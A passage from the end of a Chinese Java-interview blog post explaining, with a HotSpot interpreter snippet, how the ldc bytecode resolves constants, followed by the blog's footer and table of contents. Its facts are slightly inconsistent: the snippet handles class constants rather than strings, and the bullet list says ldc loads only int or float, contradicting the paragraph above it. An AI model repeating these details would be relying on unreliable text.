<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IRT_ENTRY(void, InterpreterRuntime::ldc(JavaThread* thread, bool wide))</span><br><span class="line">  // access constant pool</span><br><span class="line">  ConstantPool* pool = method(thread)-&gt;constants();</span><br><span class="line">  int index = wide ? get_index_u2(thread, Bytecodes::_ldc_w) : get_index_u1(thread, Bytecodes::_ldc);</span><br><span class="line">  constantTag tag = pool-&gt;tag_at(index);</span><br><span class="line"></span><br><span class="line">  assert (tag.is_unresolved_klass() || tag.is_klass(), &quot;wrong ldc call&quot;);</span><br><span class="line">  Klass* klass = pool-&gt;klass_at(index, CHECK);</span><br><span class="line">    oop java_class = klass-&gt;java_mirror();</span><br><span class="line">    thread-&gt;set_vm_result(java_class);</span><br><span class="line">IRT_END</span><br></pre></td></tr></table></figure>





<p>所以，字符串常量，是在第一次被调用(准确的说是ldc指令)的时候，进行解析并在字符串池中创建对应的String实例的。</p>
<blockquote>
<p>在Java字节码中，<strong>ldc</strong>（Load Constant）指令用于从当前类的常量池中加载一个int、float或String类型的常量到操作数栈上。这是Java虚拟机（JVM）的一部分，主要用于程序运行时从常量池中提取数据和引用。<br>在Java代码中使用一个字符串或者数字时，编译器会将其放入常量池中，运行时通过<strong>ldc</strong>指令将这些常量加载到栈上，以便进行后续的操作或计算。这种机制优化了程序的性能，避免了重复创建相同的字符串或包装类实例。</p>
</blockquote>
<blockquote>
<ul>
<li><strong>ldc</strong>：用于加载int或float常量。</li>
<li><strong>ldc_w</strong>：扩展版本的<strong>ldc</strong>，用于加载宽索引的int或float常量，或是一个String常量。</li>
<li><strong>ldc2_w</strong>：用于加载long和double类型的常量。</li>
</ul>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/Cherises/">Leonardo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://cherises.github.io/post/34319/">https://cherises.github.io/post/34319/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://github.com/Cherises/">Leonardo</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/136.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/actor-1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Leonardo</div><div class="author-info-description">Focus on thinking, imagination, reasoning, truth-seeking, and pragmatism</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">108</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">149</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">23</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Cherises/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E6%B3%9B%E5%9E%8B%E4%B8%AD%E4%B8%8A%E4%B8%8B%E7%95%8C%E9%99%90%E5%AE%9A%E7%AC%A6extends-%E5%92%8C-super%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">✅泛型中上下界限定符extends 和 super有什么区别？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94"><span class="toc-number">1.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extends"><span class="toc-number">1.1.1.</span> <span class="toc-text">extends</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#super"><span class="toc-number">1.1.2.</span> <span class="toc-text">super</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PECS-%E5%8E%9F%E5%88%99"><span class="toc-number">1.1.3.</span> <span class="toc-text">PECS 原则</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E6%8E%A5%E5%8F%A3%E5%92%8C%E6%8A%BD%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">✅接口和抽象类的区别，如何选择？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-1"><span class="toc-number">2.1.</span> <span class="toc-text">典型回答</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BD%A0%E7%9F%A5%E9%81%93fastjson%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%90%97"><span class="toc-number">3.</span> <span class="toc-text">✅你知道fastjson的反序列化漏洞吗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-2"><span class="toc-number">3.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoType"><span class="toc-number">3.1.3.</span> <span class="toc-text">AutoType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoType-%E4%BD%95%E9%94%99%E4%B9%8B%E6%9C%89%EF%BC%9F"><span class="toc-number">3.1.4.</span> <span class="toc-text">AutoType 何错之有？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87checkAutotype%EF%BC%8C%E9%BB%91%E5%AE%A2%E4%B8%8Efastjson%E7%9A%84%E5%8D%9A%E5%BC%88"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">绕过checkAutotype，黑客与fastjson的博弈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#autoType%E4%B8%8D%E5%BC%80%E5%90%AF%E4%B9%9F%E8%83%BD%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">3.1.4.2.</span> <span class="toc-text">autoType不开启也能被攻击？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.4.3.</span> <span class="toc-text">利用异常进行攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoType-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%BC%8F%EF%BC%9F"><span class="toc-number">3.1.5.</span> <span class="toc-text">AutoType 安全模式？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3Java%E4%B8%AD%E7%9A%84%E5%A4%9A%E6%80%81%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">✅如何理解Java中的多态？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-3"><span class="toc-number">4.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E7%9A%84%E9%87%8D%E8%BD%BD%E4%B8%8E%E9%87%8D%E5%86%99"><span class="toc-number">4.1.2.</span> <span class="toc-text">方法的重载与重写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%BD%BD%E5%92%8C%E9%87%8D%E5%86%99%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">重载和重写的区别</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">✅如何理解面向对象和面向过程？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-4"><span class="toc-number">5.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95"><span class="toc-number">5.2.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%B8%89%E5%A4%A7%E5%9F%BA%E6%9C%AC%E7%89%B9%E5%BE%81"><span class="toc-number">5.3.</span> <span class="toc-text">面向对象的三大基本特征?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E8%A3%85"><span class="toc-number">5.3.1.</span> <span class="toc-text">封装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-number">5.3.2.</span> <span class="toc-text">继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%80%81"><span class="toc-number">5.3.3.</span> <span class="toc-text">多态</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%92%8C%E5%AE%9E%E7%8E%B0"><span class="toc-number">5.4.</span> <span class="toc-text">继承和实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88Java%E4%B8%8D%E6%94%AF%E6%8C%81%E5%A4%9A%E7%BB%A7%E6%89%BF%EF%BC%9F"><span class="toc-number">5.4.1.</span> <span class="toc-text">为什么Java不支持多继承？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BA%94%E5%A4%A7%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99%EF%BC%9F"><span class="toc-number">5.5.</span> <span class="toc-text">面向对象的五大基本原则？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99%EF%BC%9A%E4%B8%80%E4%B8%AA%E7%B1%BB%E6%9C%80%E5%A5%BD%E5%8F%AA%E5%81%9A%E4%B8%80%E4%BB%B6%E4%BA%8B"><span class="toc-number">5.5.0.1.</span> <span class="toc-text">单一职责原则：一个类最好只做一件事</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E6%94%BE%E5%B0%81%E9%97%AD%E5%8E%9F%E5%88%99%EF%BC%9A%E5%AF%B9%E6%89%A9%E5%B1%95%E5%BC%80%E6%94%BE%E3%80%81%E5%AF%B9%E4%BF%AE%E6%94%B9%E5%B0%81%E9%97%AD"><span class="toc-number">5.5.0.2.</span> <span class="toc-text">开放封闭原则：对扩展开放、对修改封闭</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8C%E6%B0%8F%E6%9B%BF%E6%8D%A2%E5%8E%9F%E5%88%99%EF%BC%9A%E5%AD%90%E7%B1%BB%E5%BF%85%E9%A1%BB%E8%83%BD%E5%A4%9F%E6%9B%BF%E6%8D%A2%E5%85%B6%E5%9F%BA%E7%B1%BB"><span class="toc-number">5.5.0.3.</span> <span class="toc-text">里氏替换原则：子类必须能够替换其基类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99%EF%BC%9A%E7%A8%8B%E5%BA%8F%E8%A6%81%E4%BE%9D%E8%B5%96%E4%BA%8E%E6%8A%BD%E8%B1%A1%E6%8E%A5%E5%8F%A3%EF%BC%8C%E8%80%8C%E4%B8%8D%E6%98%AF%E5%85%B7%E4%BD%93%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">5.5.0.4.</span> <span class="toc-text">依赖倒置原则：程序要依赖于抽象接口，而不是具体的实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E9%9A%94%E7%A6%BB%E5%8E%9F%E5%88%99%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%A4%9A%E4%B8%AA%E5%B0%8F%E7%9A%84%E4%B8%93%E9%97%A8%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E8%80%8C%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%AA%E5%A4%A7%E7%9A%84%E6%80%BB%E6%8E%A5%E5%8F%A3"><span class="toc-number">5.5.0.5.</span> <span class="toc-text">接口隔离原则：使用多个小的专门的接口，而不要使用一个大的总接口</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AFAIO%E3%80%81BIO%E5%92%8CNIO%EF%BC%9F"><span class="toc-number">6.</span> <span class="toc-text">✅什么是AIO、BIO和NIO？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-5"><span class="toc-number">6.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95-1"><span class="toc-number">6.2.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E4%B8%ADBIO%E3%80%81NIO%E3%80%81AIO%E5%88%86%E5%88%AB%E9%80%82%E7%94%A8%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%EF%BC%9F"><span class="toc-number">6.3.</span> <span class="toc-text">Java中BIO、NIO、AIO分别适用哪些场景？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AFSPI%EF%BC%8C%E5%92%8CAPI%E6%9C%89%E5%95%A5%E5%8C%BA%E5%88%AB"><span class="toc-number">7.</span> <span class="toc-text">✅什么是SPI，和API有啥区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-6"><span class="toc-number">7.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95-2"><span class="toc-number">7.2.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AASPI"><span class="toc-number">7.3.</span> <span class="toc-text">如何定义一个SPI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPI%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">7.4.</span> <span class="toc-text">SPI的实现原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPI%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">7.5.</span> <span class="toc-text">SPI的应用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AFUUID%EF%BC%8C%E8%83%BD%E4%BF%9D%E8%AF%81%E5%94%AF%E4%B8%80%E5%90%97%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">✅什么是UUID，能保证唯一吗？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-7"><span class="toc-number">8.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">8.1.0.1.</span> <span class="toc-text">优缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%AE%9E%E7%8E%B0"><span class="toc-number">8.1.0.2.</span> <span class="toc-text">各个版本实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E6%80%BB%E7%BB%93"><span class="toc-number">8.1.0.3.</span> <span class="toc-text">各个版本总结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%8D%E5%B0%84%E6%85%A2%EF%BC%9F"><span class="toc-number">9.</span> <span class="toc-text">✅什么是反射机制？为什么反射慢？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-8"><span class="toc-number">9.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-2"><span class="toc-number">9.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">9.3.</span> <span class="toc-text">反射常见的应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%92%8CClass%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">9.4.</span> <span class="toc-text">反射和Class的关系</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AF%E6%B3%9B%E5%9E%8B%EF%BC%9F%E6%9C%89%E4%BB%80%E4%B9%88%E5%A5%BD%E5%A4%84%EF%BC%9F"><span class="toc-number">10.</span> <span class="toc-text">✅什么是泛型？有什么好处？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-9"><span class="toc-number">10.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95-3"><span class="toc-number">10.2.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%9E%8B%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%9A%84"><span class="toc-number">10.3.</span> <span class="toc-text">泛型是如何实现的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E6%93%A6%E9%99%A4%E7%9A%84%E7%BC%BA%E7%82%B9%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">10.4.</span> <span class="toc-text">类型擦除的缺点有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%B3%9B%E5%9E%8B%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">10.5.</span> <span class="toc-text">对泛型通配符的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#List-List-List%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">10.6.</span> <span class="toc-text">List&lt;?&gt;, List&lt;Object&gt;, List之间的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%B3%9B%E5%9E%8B%E4%B8%BAInteger%E7%9A%84ArrayList%E4%B8%AD%E5%AD%98%E6%94%BE%E4%B8%80%E4%B8%AAString%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">10.7.</span> <span class="toc-text">在泛型为Integer的ArrayList中存放一个String类型的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%95%B0%E7%BB%84%E5%8D%8F%E5%8F%98%E5%92%8C%E6%B3%9B%E5%9E%8B%E9%9D%9E%E5%8D%8F%E5%8F%98%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">10.8.</span> <span class="toc-text">对数组协变和泛型非协变的理解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%9E%8B%E6%93%A6%E9%99%A4%EF%BC%9F"><span class="toc-number">11.</span> <span class="toc-text">✅什么是类型擦除？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-10"><span class="toc-number">11.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-3"><span class="toc-number">11.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%AF%B9%E6%B3%9B%E5%9E%8B%E7%9A%84%E6%94%AF%E6%8C%81"><span class="toc-number">11.3.</span> <span class="toc-text">C语言对泛型的支持</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AF%E6%B7%B1%E6%8B%B7%E8%B4%9D%E5%92%8C%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%9F"><span class="toc-number">12.</span> <span class="toc-text">✅什么是深拷贝和浅拷贝？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-11"><span class="toc-number">12.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-4"><span class="toc-number">12.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BeanUtils%E7%9A%84%E6%B5%85%E6%8B%B7%E8%B4%9D"><span class="toc-number">12.3.</span> <span class="toc-text">BeanUtils的浅拷贝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">12.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%B7%B1%E6%8B%B7%E8%B4%9D"><span class="toc-number">12.5.</span> <span class="toc-text">实现深拷贝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0Cloneable%E6%8E%A5%E5%8F%A3%EF%BC%8C%E9%87%8D%E5%86%99clone"><span class="toc-number">12.5.1.</span> <span class="toc-text">实现Cloneable接口，重写clone()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E7%8E%B0%E6%B7%B1%E6%8B%B7%E8%B4%9D"><span class="toc-number">12.5.2.</span> <span class="toc-text">序列化实现深拷贝</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">13.</span> <span class="toc-text">✅什么是序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-12"><span class="toc-number">13.1.</span> <span class="toc-text">典型回答</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86-5"><span class="toc-number">13.2.</span> <span class="toc-text">扩展知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">13.3.</span> <span class="toc-text">如何进行序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E5%AE%9E%E7%8E%B0Serializable%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%97%EF%BC%9F"><span class="toc-number">13.3.1.</span> <span class="toc-text">未实现Serializable，可以序列化吗？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E2%9C%85%E8%AF%B4%E5%87%A0%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AF%AD%E6%B3%95%E7%B3%96%EF%BC%9F"><span class="toc-number">14.</span> <span class="toc-text">✅说几个常见的语法糖？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E5%9B%9E%E7%AD%94-13"><span class="toc-number">14.1.</span> <span class="toc-text">典型回答</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95-4"><span class="toc-number">14.1.1.</span> <span class="toc-text">知识扩展</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E8%AF%AD%E6%B3%95%E7%B3%96%EF%BC%9F"><span class="toc-number">14.1.2.</span> <span class="toc-text">如何解语法糖？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%B8%80%E3%80%81-switch-%E6%94%AF%E6%8C%81-String-%E4%B8%8E%E6%9E%9A%E4%B8%BE"><span class="toc-number">14.1.3.</span> <span class="toc-text">糖块一、 switch 支持 String 与枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%BA%8C%E3%80%81-%E6%B3%9B%E5%9E%8B"><span class="toc-number">14.1.4.</span> <span class="toc-text">糖块二、 泛型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%B8%89%E3%80%81-%E8%87%AA%E5%8A%A8%E8%A3%85%E7%AE%B1%E4%B8%8E%E6%8B%86%E7%AE%B1"><span class="toc-number">14.1.5.</span> <span class="toc-text">糖块三、 自动装箱与拆箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%9B%9B-%E3%80%81-%E6%96%B9%E6%B3%95%E5%8F%98%E9%95%BF%E5%8F%82%E6%95%B0"><span class="toc-number">14.1.6.</span> <span class="toc-text">糖块四 、 方法变长参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E4%BA%94-%E3%80%81-%E6%9E%9A%E4%B8%BE"><span class="toc-number">14.1.7.</span> <span class="toc-text">糖块五 、 枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%96%E5%9D%97%E5%85%AD-%E3%80%81-%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-number">14.1.8.</span> <span class="toc-text">糖块六 、 内部类</span></a></li><li 